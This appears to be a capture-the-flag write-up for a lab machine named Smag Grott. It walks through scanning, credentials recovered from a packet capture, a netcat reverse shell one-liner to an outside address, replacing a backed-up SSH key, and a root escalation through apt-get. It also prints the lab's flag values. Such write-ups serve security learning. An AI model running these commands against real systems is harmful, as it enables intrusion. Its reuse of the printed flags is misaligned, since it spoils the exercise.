> Smag Grott | Packet Analysing

**export IP=10.10.175.70**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn vv -p- -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
```

# Gobuster

sudo gobuster -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 20 -x txt,php,bak,zip -o gobuster/initial

```
/mail
```

We find a .pcap file here and it has an username and password. `helpdesk:cH4nG3M3_n0w`

We have to add `development.smag.thm` to our /etc/hosts as it says in the packet.

We have a login page now. WE can login using those credentials

We can execute remote commands. Let's spin a reverse shell

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.107.21 1234 >/tmp/f`

# Crontab

We have jake's SSH key being backed up to jake's home directory.

Let's change that to our own.

In local machine type , `ssh-keygen -o`

And I gave no password. S after sometime we can login as jake with no password.


ssh -i id_rsa jake@$IP

# User.txt

```
iusGorV7EbmxM5AuIe2w499msaSuqU3j
```

# Priv Esc

sudo -l

```
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

# GTFO-Bins

apt-get

`sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`

We are root!!

# root.txt

```
uJr6zRgetaniyHVRqqL58uRasybBKz2T
```